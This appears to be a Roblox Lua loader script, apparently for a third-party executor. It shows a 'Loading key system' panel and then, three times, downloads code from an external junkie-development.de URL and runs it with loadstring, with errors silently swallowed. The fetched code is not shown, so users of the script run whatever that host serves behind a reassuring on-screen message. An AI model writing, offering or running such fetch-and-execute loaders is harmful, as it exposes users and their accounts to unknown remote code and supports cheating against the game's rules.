local player = game.Players.LocalPlayer

-- ===============================
-- WARNING GUI
-- ===============================
local gui = Instance.new("ScreenGui")
gui.Name = "ExecutionWarning"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 400, 0, 150)
frame.Position = UDim2.new(0.5, -200, 0.3, 0)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 0
frame.Parent = gui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = frame

local stroke = Instance.new("UIStroke")
stroke.Thickness = 2
stroke.Color = Color3.fromRGB(255, 170, 0)
stroke.Parent = frame

local text = Instance.new("TextLabel")
text.Size = UDim2.new(1, -20, 1, -20)
text.Position = UDim2.new(0, 10, 0, 10)
text.BackgroundTransparency = 1
text.Text = "Loading key system… please wait"
text.TextColor3 = Color3.fromRGB(255, 200, 0)
text.TextWrapped = true
text.Font = Enum.Font.GothamBold
text.TextSize = 20
text.Parent = frame

task.delay(10, function()
    if gui then
        gui:Destroy()
    end
end)

-- ===============================
-- JUNKIE AUTO-EXECUTION FIX
-- ===============================

local JUNKIE_URL = "https://api.junkie-development.de/api/v1/luascripts/public/e2a14e5075e286bb29a93063129d767a9a7337f5a94cc1ada42c335bef36dba7/download"

for i = 1, 3 do
    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet(JUNKIE_URL))()
        end)
    end)
    task.wait(0.15) -- small delay to avoid collisions
end
